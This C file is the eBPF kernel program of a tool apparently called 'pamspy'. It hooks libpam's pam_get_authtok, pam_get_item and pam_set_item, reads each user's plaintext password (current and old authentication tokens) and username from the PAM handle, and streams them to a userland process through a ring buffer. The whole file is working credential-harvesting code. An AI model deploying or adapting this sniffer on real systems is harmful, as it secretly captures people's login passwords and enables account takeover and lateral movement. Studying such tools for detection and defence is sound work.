// SPDX-License-Identifier: BSD-3-Clause
#include "vmlinux.h"
#include "pamspy_event.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>

char LICENSE[] SEC("license") = "Dual BSD/GPL";

/******************************************************************************/
/*!
 *  \brief  dump from source code of libpam
 *          This is a partial header
 */
typedef struct pam_handle_s
{
  char *authtok;
  unsigned caller_is;
  void *pam_conversation;
  char *oldauthtok;
  char *prompt; /* for use by pam_get_user() */
  char *service_name;
  char *user;
  char *rhost;
  char *ruser;
  char *tty;
  char *xdisplay;
  char *authtok_type; /* PAM_AUTHTOK_TYPE */
  void *data;
  void *env; /* structure to maintain environment list */
} pam_handle_t;

#define PAM_AUTHTOK 6
#define PAM_OLDAUTHTOK 7

struct pam_context_t {
    pam_handle_t *pamh;
    u64 item;
    u64 item_ptr;
};

/******************************************************************************/
/*!
 *  \brief  ring buffer use to communicate with userland process
 */
struct
{
  __uint(type, BPF_MAP_TYPE_RINGBUF);
  __uint(max_entries, 256 * 1024);
} rb SEC(".maps");

/******************************************************************************/
/*!
 *  \brief  bpf hash map use to store pam_handle_t pointer
 */
struct {
    __uint(type       , BPF_MAP_TYPE_HASH);
    __uint(key_size   , sizeof(uint32_t));
    __uint(value_size , sizeof(struct pam_context_t));
    __uint(max_entries, 1024);
} pam_handle_t_map SEC(".maps");

/******************************************************************************/
/*!
 *  \brief  main userland probe program
 *  
 *  int pam_get_authtok(pam_handle_t *pamh, int item,
 *                         const char **authtok, const char *prompt);
 *
 */

SEC("uprobe/pam_get_authtok")
int get_addr_pam_get_authtok(struct pt_regs *ctx)
{
  if (!PT_REGS_PARM1(ctx))
    return 0;

  struct pam_context_t ctx_data = {};
  ctx_data.pamh = (pam_handle_t*)PT_REGS_PARM1(ctx);
  ctx_data.item = (u64)PT_REGS_PARM2(ctx);
  ctx_data.item_ptr = 0; // Not used for get_authtok

  // Get current PID to track
  u32 pid = bpf_get_current_pid_tgid() >> 32;

  // Store pam_handle_t pointer in map for later use
  bpf_map_update_elem(&pam_handle_t_map, &pid, &ctx_data, BPF_ANY);

  return 0;
};

SEC("uretprobe/pam_get_authtok")
int trace_pam_get_authtok(struct pt_regs *ctx)
{
  pam_handle_t *phandle = 0;
  u64 item = 0;

  // Get current PID to track
  u32 pid = bpf_get_current_pid_tgid() >> 32;

  // Get pam_context_t from map
  struct pam_context_t *ctx_data = bpf_map_lookup_elem(&pam_handle_t_map, &pid);
  if (!ctx_data)
    return 0;

  phandle = ctx_data->pamh;
  item = ctx_data->item;

  // Delete map entry after use
  if (bpf_map_delete_elem(&pam_handle_t_map, &pid)) return 0;

  // retrieve output parameter
  u64 password_addr = 0;

  if (item == PAM_AUTHTOK) {
      if (phandle)
          bpf_probe_read(&password_addr, sizeof(password_addr), &phandle->authtok);
  } else if (item == PAM_OLDAUTHTOK) {
      if (phandle)
          bpf_probe_read(&password_addr, sizeof(password_addr), &phandle->oldauthtok);
  } else {
      // Ignore other items
      return 0; 
  }

  u64 username_addr = 0;
  bpf_probe_read(&username_addr, sizeof(username_addr), &phandle->user);

  event_t *e;
  e = bpf_ringbuf_reserve(&rb, sizeof(*e), 0);
  if (e)
  {
    e->pid = pid;
    bpf_probe_read(&e->password, sizeof(e->password), (void *)password_addr);
    bpf_probe_read(&e->username, sizeof(e->username), (void *)username_addr);
    bpf_get_current_comm(&e->comm, sizeof(e->comm));
    bpf_ringbuf_submit(e, 0);
  }

  return 0;
};

/*
 *  int pam_get_item(const pam_handle_t *pamh, int item_type, const void **item);
 */
SEC("uprobe/pam_get_item")
int get_addr_pam_get_item(struct pt_regs *ctx)
{
  if (!PT_REGS_PARM1(ctx))
    return 0;

  struct pam_context_t ctx_data = {};
  ctx_data.pamh = (pam_handle_t*)PT_REGS_PARM1(ctx);
  ctx_data.item = (u64)PT_REGS_PARM2(ctx);
  ctx_data.item_ptr = (u64)PT_REGS_PARM3(ctx);

  u32 pid = bpf_get_current_pid_tgid() >> 32;
  bpf_map_update_elem(&pam_handle_t_map, &pid, &ctx_data, BPF_ANY);

  return 0;
}

SEC("uretprobe/pam_get_item")
int trace_pam_get_item(struct pt_regs *ctx)
{
  pam_handle_t *phandle = 0;
  u64 item = 0;
  u64 item_ptr = 0;

  u32 pid = bpf_get_current_pid_tgid() >> 32;
  struct pam_context_t *ctx_data = bpf_map_lookup_elem(&pam_handle_t_map, &pid);
  if (!ctx_data)
    return 0;

  phandle = ctx_data->pamh;
  item = ctx_data->item;
  item_ptr = ctx_data->item_ptr;

  bpf_map_delete_elem(&pam_handle_t_map, &pid);

  if (item != PAM_AUTHTOK && item != PAM_OLDAUTHTOK)
      return 0;

  if (!item_ptr)
      return 0;

  u64 password_addr = 0;
  // Read the pointer value from item_ptr (which is void**)
  bpf_probe_read(&password_addr, sizeof(password_addr), (void*)item_ptr);

  if (!password_addr)
      return 0;

  u64 username_addr = 0;
  bpf_probe_read(&username_addr, sizeof(username_addr), &phandle->user);

  event_t *e;
  e = bpf_ringbuf_reserve(&rb, sizeof(*e), 0);
  if (e)
  {
    e->pid = pid;
    bpf_probe_read(&e->password, sizeof(e->password), (void *)password_addr);
    bpf_probe_read(&e->username, sizeof(e->username), (void *)username_addr);
    bpf_get_current_comm(&e->comm, sizeof(e->comm));
    bpf_ringbuf_submit(e, 0);
  }

  return 0;
}

/*
 *  int pam_set_item(pam_handle_t *pamh, int item_type, const void *item);
 */
SEC("uprobe/pam_set_item")
int trace_pam_set_item(struct pt_regs *ctx)
{
  if (!PT_REGS_PARM1(ctx))
    return 0;

  pam_handle_t *phandle = (pam_handle_t*)PT_REGS_PARM1(ctx);
  u64 item = (u64)PT_REGS_PARM2(ctx);
  u64 password_addr = (u64)PT_REGS_PARM3(ctx);

  if (item != PAM_AUTHTOK && item != PAM_OLDAUTHTOK)
      return 0;
      
  if (!password_addr)
      return 0;

  u32 pid = bpf_get_current_pid_tgid() >> 32;

  u64 username_addr = 0;
  bpf_probe_read(&username_addr, sizeof(username_addr), &phandle->user);

  event_t *e;
  e = bpf_ringbuf_reserve(&rb, sizeof(*e), 0);
  if (e)
  {
    e->pid = pid;
    bpf_probe_read(&e->password, sizeof(e->password), (void *)password_addr);
    bpf_probe_read(&e->username, sizeof(e->username), (void *)username_addr);
    bpf_get_current_comm(&e->comm, sizeof(e->comm));
    bpf_ringbuf_submit(e, 0);
  }

  return 0;
}
